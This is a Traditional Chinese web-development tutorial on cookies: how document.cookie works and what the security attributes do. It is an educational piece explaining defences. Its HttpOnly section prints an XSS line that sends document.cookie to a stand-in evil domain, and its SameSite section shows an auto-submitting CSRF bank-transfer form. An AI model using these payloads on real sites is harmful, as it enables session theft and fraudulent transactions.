---
title: "Cookie 是什麼：如何使用 JavaScript 操作 document.cookie"
tags: ["javascript", "web browser", "frontend interview"]
date: "2020-06-19"
---

了解什麼是 cookie，學習如何使用 JavaScript 讀取和設定 cookie，掌握 Path、Domain、Max-Age、Expires、Secure、HttpOnly、SameSite 等參數的應用，並深入探討 cookie 安全性議題。

## 目錄

```toc
```

<br>

## Cookie 是什麼？

Cookie 是儲存在瀏覽器的一小段文字資料，通常由伺服器透過 `Set-Cookie` header 傳遞給瀏覽器。瀏覽器收到後會將 cookie 儲存起來，並在之後的請求回傳 cookie 至同樣的伺服器。

## Cookie 的用途

Cookie 最常見的用途之一是認證身份，例如登入狀態、購物車等，也被應用於追蹤使用者及廣告上。

Cookie 也被用於客戶端的儲存方式，但由於 cookie 會被附加在每一次的 request 之中，可能會影響效能，所以如果是不需要記錄在 server 的資訊，可以改用 storage API。

## Set-Cookie header

Server 可以在 HTTP response 中回傳 `Set-Cookie` header 來告訴瀏覽器要設定 cookie。設定的語法如下：

```plaintext
Set-Cookie: [cookie名稱]=[cookie值]
```

瀏覽器看到 `Set-Cookie` header 便會將 cookie 儲存起來，之後對同一個 domain 發送 HTTP request 的時候，瀏覽器就會將 cookie 帶在 HTTP request 的 `Cookie` header 裡。

Request 中的 cookie header 會是 `[cookie名稱]=[cookie值]` 的形式，用分號串接之後的結果：

```plaintext
Cookie: [cookie1]=[value1]; [cookie2]=[value2]
```

## 如何用 JavaScript 讀取 Cookie

在 JavaScript 中，想要讀取 cookie 可用 `document.cookie`:

```javascript
console.log(document.cookie);
```

讀取出來的 `document.cookie` 會得到一個字串，這個字串是將這個網域底下所有 cookie 用分號串接以後的結果，其中每個 cookie 都是 `[cookie名稱]=[cookie值]` 的形式，例如：`name=John; gender=male` 表示這個網域底下有兩個 cookie：`name` 和 `gender`，其中 `name` 的值是 `John`，而 `gender` 的值是 `male`。

那要如何讀取特定 cookie 的值，例如：如何從 `name=John; gender=male` 的字串得到 `name` 和 `gender` 這兩個 cookie 的值呢？我們可以試著自己寫一個函式 parse，或是利用較為成熟的第三方套件，例如：[cookie](https://github.com/jshttp/cookie)等。

```JavaScript
// Reference: https://stackoverflow.com/questions/10730362/get-cookie-by-name
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}
```

## 如何用 JavaScrip 寫入 Cookie

用 JavaScript 寫入 cookie 的方式是 `document.cookie = 'key=value;'`。注意雖然我們用 `document.cookie = ...`，但是並不會整個 cookie 都被覆蓋掉，只有我們指定的 key 會被更新。如下面的例子，`cookie3` 會被新增的同時，原本的 `cookie1` 和 `cookie2` 都還會保留著。

```javascript
console.log(document.cookie); // cookie1=value1; cookie2=value2;
document.cookie = 'cookie3=value3';
console.log(document.cookie); // cookie1=value1; cookie2=value2; cookie3=value3;
```

## Cookie 的參數

Cookie 除了名稱和值之外，通常還需要設定其他額外參數，下面會一一介紹。新增參數的方式是用分號區隔各個參數，例如：

```plaintext
user=John; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT
```

簡單地說，我們會用 `Domain` 和 `Path` 指定 cookie 的可用範圍，用 `Expires` 和 `Max-Age` 控制 cookie 的有效期限，而 `HttpOnly`、`Secure`、和 `SameSite` 則是和安全性相關的參數。

### Domain

```plaintext
domain=example.com
```

`domain` 用來指定哪些網域可以存取這個 cookie。**預設值是當前網域，但是不包含其子網域。**

例如在 example.com 底下設置的 cookie 不指定 `domain` 的情況下，只有 example.com 可以存取此 cookie，但子網域如 subdomain.example.com 則無法存取此 cookie。

如果我們想要讓子網域存取 cookie，就必須明確地設定 `domain` 參數。例如：當一個 cookie 指定 `domain=example.com` 時，包含 example.com 以及他的子網域 subdomain.example.com 都能夠存取這個 cookie。


### Path

```plaintext
path=/admin
```

`path` 參數用來指定哪些路徑可以存取這個 cookie。

例如：假設 domain 是 example.com，且 `path=/admin`，則 example.com/admin 或是子路徑 example.com/admin/settings 都可以存取此 cookie，但 example.com 或是 example.com/home 則無法存取此 cookie。

**`Path` 的預設值是當前的路徑。**

一般而言來說，認證用途的 cookie 會設成 `path=/`，讓全站都可以存取此 cookie，如此一來不管你在網站的哪個路徑下，server 都能認得你的身份。

### Expires, Max-age

`expires`, `max-age` 參數的作用是設定 cookie 的有效期限。

**如果沒有額外設定 `expires` 或是 `max-age` 參數，當瀏覽器關閉之後，儲存在瀏覽器的 cookie 便會消失，這就是所謂的 session cookie**。

如果我們希望瀏覽器關掉之後 cookie 還是會被儲存下來，那就必須設定 `expires` 或是 `max-age`。

`expires` 是 UTC 格式表示的有效期限，在 JavaScript 中可用 `date.toUTCString()` 取得：

```plaintext
cookie=value; expires=Tue, 19 Jan 2038 03:14:07 GMT
```

`max-age` 表示從設定開始算之後幾秒之內 cookie 是有效的：

```plaintext
cookie=value; max-age=3600
```

### Secure

`Secure` 參數的作用是讓 cookie 只能透過 https 傳遞。**Cookie 預設是不區分 http 或是 https 的。**

換句話說，當我們設定 http://example.com 的 cookie 時，https://example.com 也能看得到同樣的 cookie。

如果 cookie 設了 `secure` 參數，只有透過 https 存取這個網站才能存取這個 cookie；透過 http 存取這個網站會看不到這個 cookie。

這個參數的作用在於保護 cookie 只能在 https 傳遞。話雖如此，我們還是不能將敏感資訊儲存在 cookie 中。

### HttpOnly

`HttpOnly` 參數的作用是防止 JavaScript 存取 cookie。

當一個 cookie 設置了 `httpOnly` 的屬性之後，JavaScript 就不能存取這個 cookie，但是瀏覽器在發送 request 的時候還是會幫你帶在 request header 裡面。

這個參數的設計是為了安全性考量，因為如果 JavaScript 能夠存取這個 cookie 就有受到 XSS Attack (Cross-Site Scripting，跨站腳本攻擊) 的風險。

什麼是 XSS Attack (跨站腳本攻擊) 呢？簡單的說，就是將一段惡意的 JavaScript 程式碼透過表單等方式上傳到 server，之後這份表單資料在前端呈現的時候惡意的 JavaScript 程式碼會被當成是 HTML 的一部分被執行。假設壞人能夠執行 JavaScript，便能很輕易地存取 `document.cookie`，就能夠竊取你用來登入的 cookie，並且用你的身份做惡意的操作：

```JavaScript
// 把你的 cookie 送到壞人的伺服器
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

這就是為什麼我們需要禁止 JavaScript 存取 cookie。

### SameSite

`Samesite` 的作用是防止 cookie 以跨站方式傳送，可以幫助避免 CSRF (Cross-Site Request Forgery，跨站請求偽造) 攻擊。要理解 SameSite 如何幫助防止 CSRF 攻擊之前，我們需要先理解 CSRF 攻擊。

CSRF 攻擊是什麼呢？簡單地說，他會在受害者已登入的狀態下，假借受害者的身份進行惡意操作，例如把受害者銀行裡的錢轉到攻擊者自己的帳戶中。

那具體而言 CSRF 攻擊如何進行？

1. 假設含有使用者的機敏資訊網站叫做 bank.com，使用者成功登入 bank.com 後會收到一個加密過後的代表他的身份的 cookie，後續的 request 都會帶有這個 cookie。因為 cookie 經過加密無法輕易偽造，所以 server 可以認證 request 是來自這個使用者本人，也會同意他的轉帳等敏感操作。
2. 壞人透過釣魚信件等方式讓你不小心進到壞人的網站 evil.com，網頁包含一小段發送表單的代碼，會把 bank.com 的錢轉到壞人的戶頭：

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="account" value="john">
  <input type="hidden" name="amount" value="1000000">
  <input type="hidden" name="for" value="badguy">
</form>
<script>window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }</script>
```

因為送往 bank.com 的 request 都會帶有用來表示身份的 cookie，包含發送表單的 POST request，所以 server 會認為這個 request 沒有問題，然後錢就轉給壞人了～

> 註：一般而言會在表單中多帶一個 server 產生的 CSRF token 去防範此攻擊，但與 `SameSite` 兩個防護措施可同時並行。

> 註：在 evil.com 內發送 bank.com 的請求的情境下，back.com 的 cookie 就是所謂的[第三方 cookie](./#third-party-cookie-第三方-cookie)。

這裡的關鍵是：這個 POST 是一個**跨域請求**。什麼是跨域請求呢？**當一個請求的網域和網址列中的網域不同的時候，它就是一個跨域請求。** 這裏我們可以看到，瀏覽器的網址列中的網域是 evil.com，但是我們送了一個往 bank.com 網域的 POST request，所以這是一個跨域請求。

**而跨域請求攜帶 cookie 就會有遭受 CSRF 攻擊的風險。**

那我們再回來看 `SameSite` 參數如何協助我們防範 CSRF 攻擊。

`SameSite` 一共有三種不同的設定，分別對應不同的安全性層級：

* `SameSite=strict`

`Strict` 表示 request 的網域必須跟網址列中的網域相同，才會發送這個 cookie。以上面的例子而言，發送轉帳的 POST 請求時，因為屬於跨域請求的關係，並不會攜帶表示身份的 cookie，就**不會受到 CSRF 攻擊**。

比較特別的一點是，如果是從 email 導過去 bank.com，`SameSite` cookie 也不會被發送給 server。這可以保護使用者不會因為點了釣魚信件的連結就轉帳給壞人。缺點是，即使信件確實是來自 bank.com，也一律需要使用者重新登入，相對而言較為不方便。所以這個設置比較適合用於敏感操作上，例如轉帳、修改密碼等。

* `SameSite=lax`

`Lax` cookie 和 `strict` 相比之下限制比較寬鬆一些。瀏覽器發送跨網域的 request 一樣不會攜帶 `lax` cookie，**除了導向目標網址的 GET request。**

所以單純地在瀏覽器開啟連結，或是從 email 點開連結會攜帶 `lax` cookie。

注意：[從Chrome 76 開始，預設值為 SameSite=lax](https://www.chromestatus.com/feature/5088147346030592)。這意味著第三方 cookie 在沒有明確地設定 `SameSite` 的情況下會失效。

* `SameSite=none`

跨域的情況下還是會送出 cookie。注意：[從Chrome 80 開始，使用這個選項必須同時開啟 `Secure` 參數](https://chromestatus.com/feature/5633521622188032)。如果你的產品仰賴第三方 cookie，例如廣告、iframe 嵌入套件等，應該要使用這個選項。

## 什麼是第三方 Cookie？ (Third-Party Cookie)

大家應該很常會聽到「第三方 cookie」這個名詞，它到底是什麼意思？下面簡單補充一下。

網頁很多時候會需要向其他網域請求資源，例如：我們可能會用 `<img src="...">` 的方式嵌入一張其他網域的圖片。這些 request 也可以攜帶 cookie，攜帶哪些 cookie 主要會根據資源的網域。

舉個例子說明：假設我現在瀏覽 example.com，其中包含一張圖片 `<img src="https://example.com/image.png">`，此時攜帶的 cookie 就會是 example.com 底下的 cookie。因為這個請求的網域和網址列的網域同樣都是 example.com，所以這是一個相同網域的請求。此時 example.com 底下的 cookie 又稱作第一方 cookie (first-party cookie)。

如果 example.com 包含另外一張圖片 `<img src="https://ad.com/image.png">`，他的網域是 ad.com，此時攜帶的 cookie 就會是 ad.com 底下的 cookie。因為 ad.com 不同於網址列的 example.com，所以這是一個跨域請求。此時 ad.com 底下的 cookie 又稱作**第三方 cookie (third-party cookie)**。

第三方 cookie 為什麼重要呢？因為他能夠跨網域的追蹤。舉例來說，example.com 發出 ad.com 的請求時，會攜帶 ad.com 的 cookie。如果同時有另一個網域 anothersite.com 也會請求 ad.com 的資源，也會攜帶同樣的 cookie。如果這個 cookie 是用來表示使用者 id，則對 ad.com 而言不管在哪個網域底下，他都知道兩個網站的造訪者都是你。這就是廣告追蹤的原理。

這就是為什麼在隱私權意識抬頭的今天，大家對第三方 cookie 的限制越來越多：在寫這篇文的當下 (2020/6月)，在 Chrome 你必須要明確地標示 `SameSite=None; Secure`，否則預設情況下 `SameSite=Lax`，第三方 cookie 是不會被發送的。而 Safari 直接完全禁止第三方 cookie。

## Reference

* [HTTP cookies - MDN](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Cookies)
* [Cross-site scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Cross-site_scripting_XSS)
* [Cookies, document.cookie - javascript.info](https://javascript.info/cookie)
* [SameSite cookies explained - web.dev](https://web.dev/samesite-cookies-explained/)